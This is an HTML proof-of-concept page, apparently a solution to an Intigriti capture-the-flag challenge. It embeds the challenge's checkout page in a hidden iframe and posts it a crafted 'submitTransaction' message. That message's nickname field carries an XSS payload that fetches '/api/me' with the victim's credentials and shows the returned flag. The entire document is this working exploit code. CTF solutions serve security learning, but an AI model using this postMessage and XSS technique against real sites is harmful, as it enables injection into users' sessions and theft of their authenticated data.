<!DOCTYPE html>
<html>
<body>
<iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000" style="display:none"></iframe>
<script>
window.onload = () => {
    setTimeout(() => {
        const p = `<img src=x onerror="
            fetch('/api/me',{credentials:'include'})
            .then(r=>r.json())
            .then(d=>alert('FLAG: '+d.flag))
        ">`;
        document.getElementById('f').contentWindow.postMessage({type:'submitTransaction',transaction:{toAddress:'deadbeef',currency:'BTC',amount:0.0001,nickname:p}},'*');
    },2500);
};
</script>
</body>
</html>
